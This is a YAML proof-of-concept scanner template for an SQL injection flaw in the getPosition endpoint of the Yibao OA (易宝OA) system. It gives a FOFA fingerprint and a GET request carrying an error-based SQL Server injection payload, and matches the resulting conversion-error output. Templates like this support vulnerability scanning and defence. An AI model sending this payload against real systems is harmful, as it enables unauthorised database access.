id: poc-yaml-yi-bao-oa-system-getposition-sqli
info:
  name: 易宝OA系统 getPosition SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易宝OA
  fofa: body="欢迎登录易宝OA系统"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"欢迎登录易宝OA系统")
- method: GET
  path: /SmartTradeScan/StockTake/getPosition?positionName='+AND+9173+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))+AND+'rhYc'='rhYc&stockRoomID=1&opeID=1&currentStatus=1&pickUpMode=11
  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"\"is_succeed\":false")
    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
transport: http
